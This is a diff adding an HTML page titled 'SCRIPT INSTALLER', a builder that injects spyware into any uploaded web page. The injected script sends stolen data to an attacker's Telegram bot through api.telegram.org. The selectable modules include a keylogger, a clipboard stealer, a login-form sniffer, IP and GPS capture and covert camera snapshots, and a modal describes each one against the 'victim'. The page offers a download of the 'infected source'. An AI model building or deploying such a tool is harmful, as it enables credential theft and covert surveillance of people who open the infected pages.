@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMMINAL</title>
+    <style>
+        :root { --neon: #ff0000; --bg: #050000; --glass: rgba(15, 0, 0, 0.9); }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; cursor: crosshair; }
+        
+        body { background: var(--bg); color: #fff; margin: 0; min-height: 100vh; overflow-y: auto; display: flex; flex-direction: column; align-items: center; padding: 20px 0; }
+        #bg-effect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle, #1a0000 0%, #000 100%); }
+
+        .panel { width: 95%; max-width: 800px; background: transparent; padding: 10px; margin-bottom: 10px; }
+        
+        h1 { text-align: center; color: var(--neon); text-transform: uppercase; letter-spacing: 15px; margin-bottom: 30px; text-shadow: 0 0 10px var(--neon); }
+
+        .input-group { display: flex; gap: 15px; margin-bottom: 25px; }
+        input[type="text"], textarea { width: 100%; background: #000; border: 1px solid #300; color: var(--neon); padding: 15px; outline: none; transition: 0.3s; font-size: 14px; }
+        input:focus { border-color: var(--neon); box-shadow: 0 0 15px var(--neon); }
+
+        .action-stack { display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px; }
+        .tab-btn { width: 100%; padding: 20px; background: transparent; border: 1px solid #500; color: #888; cursor: pointer; transition: 0.4s; text-transform: uppercase; font-weight: bold; letter-spacing: 2px; }
+        .tab-btn.active { border-color: var(--neon); color: var(--neon); background: rgba(255, 0, 0, 0.05); box-shadow: inset 0 0 15px rgba(255, 0, 0, 0.1); }
+
+        .content-box { margin-bottom: 30px; border: 1px solid #200; padding: 15px; background: #000; }
+        .hidden { display: none; }
+
+        .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 12px; margin-bottom: 30px; }
+        .item { background: #0a0000; border: 1px solid #200; padding: 15px; display: flex; align-items: center; gap: 12px; transition: 0.3s; font-size: 12px; }
+        .item:hover { border-color: var(--neon); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 0, 0, 0.1); }
+        .item input { accent-color: var(--neon); width: 18px; height: 18px; }
+
+        .btn-main { width: 100%; padding: 25px; background: transparent; color: var(--neon); border: 2px solid var(--neon); font-weight: 900; text-transform: uppercase; letter-spacing: 5px; cursor: pointer; transition: 0.5s; font-size: 16px; position: relative; overflow: hidden; }
+        .btn-main:hover { background: var(--neon); color: #000; box-shadow: 0 0 50px var(--neon); letter-spacing: 8px; }
+
+        .feedback-area { width: 95%; max-width: 800px; margin-top: 10px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
+        .btn-feed, .info-btn { background: transparent; color: #666; border: 1px solid #333; padding: 10px 20px; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 12px; letter-spacing: 2px; }
+        .btn-feed:hover, .info-btn:hover { color: var(--neon); border-color: var(--neon); }
+        
+        .feed-content { width: 100%; background: #0a0000; border: 1px solid #200; padding: 15px; margin-top: 10px; display: none; color: #888; animation: slideUp 0.4s ease; text-align: center; }
+        .feed-content a { color: var(--neon); text-decoration: none; font-weight: bold; font-size: 16px; display: block; margin-top: 10px; }
+
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        #notify { position: fixed; top: 20px; right: -300px; background: #100; border-left: 5px solid var(--neon); color: #fff; padding: 15px 25px; transition: 0.5s; z-index: 10000; box-shadow: 0 0 20px rgba(255,0,0,0.5); font-size: 13px; }
+        #notify.show { right: 20px; }
+        .success-text { color: var(--neon) !important; border-color: var(--neon) !important; font-weight: bold; }
+        .touch-flare { position: absolute; width: 2px; height: 2px; background: var(--neon); border-radius: 50%; pointer-events: none; animation: flare 0.6s ease-out forwards; }
+        @keyframes flare { to { transform: scale(50); opacity: 0; } }
+
+        .modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); }
+        .modal-content { background: #0a0000; margin: 5% auto; padding: 30px; border: 1px solid var(--neon); width: 90%; max-width: 700px; box-shadow: 0 0 50px rgba(255,0,0,0.2); position: relative; animation: zoomIn 0.3s ease; max-height: 85vh; overflow-y: auto; }
+        .close-btn { position: absolute; top: 10px; right: 20px; color: var(--neon); font-size: 30px; cursor: pointer; }
+        .info-list li { margin-bottom: 15px; border-bottom: 1px solid #200; padding-bottom: 5px; }
+        .info-list li b { color: var(--neon); display: block; margin-bottom: 3px; }
+        @keyframes zoomIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div id="bg-effect"></div>
+<div id="notify">ALERT</div>
+
+<div class="panel">
+    <h1>SCRIPT INSTALLER</h1>
+    <div class="input-group">
+        <input type="text" id="token" placeholder="[ TELEGRAM BOT TOKEN ]">
+        <input type="text" id="chat" placeholder="[ TELEGRAM CHAT ID ]">
+    </div>
+    <div class="action-stack">
+        <button class="tab-btn active" id="btn-up" onclick="toggleMode('upload')">UPLOAD HTML FILE</button>
+        <button class="tab-btn" id="btn-ps" onclick="toggleMode('paste')">PASTE SOURCE CODE</button>
+    </div>
+    <div class="content-box">
+        <div id="up-area">
+            <input type="file" id="fileInput" accept=".html" onchange="handleFile(this)" style="display:none">
+            <div onclick="document.getElementById('fileInput').click()" id="fileDisplay" style="text-align:center; padding:20px; cursor:pointer; color:#555;">[ CLICK TO SELECT FILE ]</div>
+        </div>
+        <div id="ps-area" class="hidden">
+            <textarea id="rawText" rows="8" placeholder="ENTER HTML CODE HERE..."></textarea>
+        </div>
+    </div>
+    <div class="payload-grid" id="options">
+        <script>
+            const scripts = ["Device Logger", "Keylogger", "Clipboard Steal", "Battery/Net", "Form Sniffer", "Tab Tracker", "Screen Info", "AREA 186 SCRIPT", "Region/Time", "GPU/Perf", "IP Hijacker", "Live Location", "Cam Snapshot"];
+            scripts.forEach((name, i) => {
+                let id = (i + 1).toString().padStart(2, '0');
+                document.write(`<label class="item"><input type="checkbox" value="${id}.js"> [${id}] ${name.toUpperCase()}</label>`);
+            });
+        </script>
+    </div>
+    <button class="btn-main" onclick="injectNow()">INSTALL INFECTION</button>
+    
+    <div id="dlBox" style="display:none; margin-top:30px; text-align:center;">
+        <a id="dlFinal" style="color:var(--neon); text-decoration:none; border:2px solid var(--neon); padding:20px; display:block; font-weight:bold; letter-spacing:3px;">DOWNLOAD INFECTED SOURCE</a>
+    </div>
+</div>
+
+<div class="feedback-area">
+    <button class="info-btn" onclick="openModal()">View Script Info</button>
+    <button class="btn-feed" onclick="toggleFeed()">Feedback / Report</button>
+    
+    <div class="feed-content" id="feedText">
+        If you need any help or if you have a report for this tool, contact directly:<br>
+        <a href="https://m.me/version.x.186" target="_blank">MARK ASSASSIN</a>
+    </div>
+</div>
+
+<div id="myModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal()">&times;</span>
+        <h2 style="color:var(--neon); border-bottom:1px solid #300; padding-bottom:10px; text-transform: uppercase; letter-spacing: 3px;">Script Documentation</h2>
+        <ul class="info-list" style="list-style:none; padding:0; font-size:13px; line-height:1.6; color:#ccc;">
+            <li><b>[01] DEVICE LOGGER</b> Collects hardware and software specifications. Uses navigator.userAgent to detect phone model, brand, OS, and browser version.</li>
+            <li><b>[02] KEYLOGGER</b> Captures every keystroke while the page is open. Sends real-time updates via addEventListener('keyup').</li>
+            <li><b>[03] CLIPBOARD STEAL</b> Attempts to retrieve the last copied text or password. Requires a user interaction (click) on modern browsers.</li>
+            <li><b>[04] BATTERY/NET</b> Monitors battery level, charging status, and network connection type (WiFi or Mobile Data) via navigator.getBattery API.</li>
+            <li><b>[05] FORM SNIFFER</b> Intercepts data entered into login forms or input boxes (usernames/passwords) and sends it before submission.</li>
+            <li><b>[06] TAB TRACKER</b> Monitors if the victim is currently viewing your page or has switched tabs. Tracks duration and page exit events.</li>
+            <li><b>[07] SCREEN INFO</b> Detects display resolution (Width x Height), color depth, and screen orientation (Portrait/Landscape).</li>
+            <li><b>[08] AEA 186 SCRIPT</b> There are about 10+ data dumps here along with scripts that include triple IP APIs all together.</li>
+            <li><b>[09] REGION/TIME</b> Identifies the victim's current timezone and local device time to determine their approximate geographical region.</li>
+            <li><b>[10] GPU/PERF</b> Checks the target's Graphics Card (GPU) model and processing performance level using WebGL APIs.</li>
+            <li><b>[11] IP HIJACKER</b> Instantly captures the victim's Public IP address and Internet Service Provider (ISP) name upon page load.</li>
+            <li><b>[12] LIVE LOCATION</b> Attempts to pinpoint GPS coordinates (Latitude/Longitude). Requires victim to click "Allow" on the location prompt.</li>
+            <li><b>[13] CAM SNAPSHOT</b> Stealthily captures photos using the front camera. Requires camera permissions from the target device.</li>
+        </ul>
+    </div>
+</div>
+
+<script>
+    let sourceData = "";
+    function openModal() { document.getElementById("myModal").style.display = "block"; }
+    function closeModal() { document.getElementById("myModal").style.display = "none"; }
+    
+    function showAlert(msg) {
+        const box = document.getElementById('notify');
+        box.innerText = "● " + msg;
+        box.classList.add('show');
+        setTimeout(() => box.classList.remove('show'), 3000);
+    }
+    function toggleMode(m) {
+        document.getElementById('btn-up').classList.toggle('active', m === 'upload');
+        document.getElementById('btn-ps').classList.toggle('active', m === 'paste');
+        document.getElementById('up-area').classList.toggle('hidden', m !== 'upload');
+        document.getElementById('ps-area').classList.toggle('hidden', m !== 'paste');
+    }
+    function toggleFeed() {
+        const f = document.getElementById('feedText');
+        f.style.display = (f.style.display === 'block') ? 'none' : 'block';
+    }
+    function handleFile(input) {
+        if(input.files[0]) {
+            let reader = new FileReader();
+            reader.onload = e => { 
+                sourceData = e.target.result; 
+                document.getElementById('fileDisplay').innerText = "■ " + input.files[0].name.toUpperCase() + " LOADED"; 
+                document.getElementById('fileDisplay').classList.add('success-text');
+                showAlert("FILE LOADED");
+            };
+            reader.readAsText(input.files[0]);
+        }
+    }
+    async function injectNow() {
+        const bot = document.getElementById('token').value;
+        const cid = document.getElementById('chat').value;
+        const mode = document.getElementById('ps-area').classList.contains('hidden') ? 'up' : 'ps';
+        const finalSource = mode === 'ps' ? document.getElementById('rawText').value : sourceData;
+        const chosen = Array.from(document.querySelectorAll('#options input:checked'));
+        if(!bot || !cid || !finalSource) return showAlert("DATA MISSING!");
+        showAlert("INJECTING...");
+        let scriptPayloads = "";
+        for(let s of chosen) {
+            try {
+                let res = await fetch(`scriptLibrary/${s.value}`);
+                let code = await res.text();
+                if((code.match(/{/g)||[]).length !== (code.match(/}/g)||[]).length) code += "}";
+                scriptPayloads += code + "\n";
+            } catch(e) {}
+        }
+        const injectTemplate = `\n<script>\nconst TOKEN='${bot}',CHAT_ID='${cid}';\nconst sendTele=m=>{fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:m,parse_mode:'Markdown'})});};\n${scriptPayloads}<\/script>`;
+        let output = finalSource.includes("</body>") ? finalSource.replace("</body>", injectTemplate + "</body>") : finalSource + injectTemplate;
+        const blob = new Blob([output], {type: 'text/html'});
+        document.getElementById('dlFinal').href = URL.createObjectURL(blob);
+        document.getElementById('dlFinal').download = "index.html";
+        document.getElementById('dlBox').style.display = "block";
+        showAlert("DONE!");
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+    window.onclick = (e) => {
+        let modal = document.getElementById("myModal");
+        if (e.target == modal) modal.style.display = "none";
+        let f = document.createElement('div'); f.className = 'touch-flare';
+        f.style.top = e.pageY + 'px'; f.style.left = e.pageX + 'px';
+        document.body.appendChild(f); setTimeout(() => f.remove(), 600);
+    };
+</script>
+</body>
+</html>
